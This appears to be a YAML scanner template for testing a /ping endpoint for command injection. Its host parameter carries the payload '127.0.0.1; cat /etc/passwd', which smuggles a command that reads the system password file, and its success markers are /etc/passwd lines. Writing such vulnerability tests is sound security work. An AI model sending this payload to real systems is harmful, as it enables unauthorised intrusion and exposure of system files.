name: 命令注入高级测试
description: 测试高级命令注入漏洞
level: 高
author: Test
request:
  method: GET
  path: /ping
  params:
    host: "127.0.0.1; cat /etc/passwd"
    count: "1"
  headers:
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
response:
  matchType: contains
  successIndicators:
    - "root:x:0:0"
    - "daemon:x:1:1"
    - "bin:x:2:2"
  errorIndicators:
    - "invalid host"
    - "ping failed"
    - "无效主机"
  statusCode: 200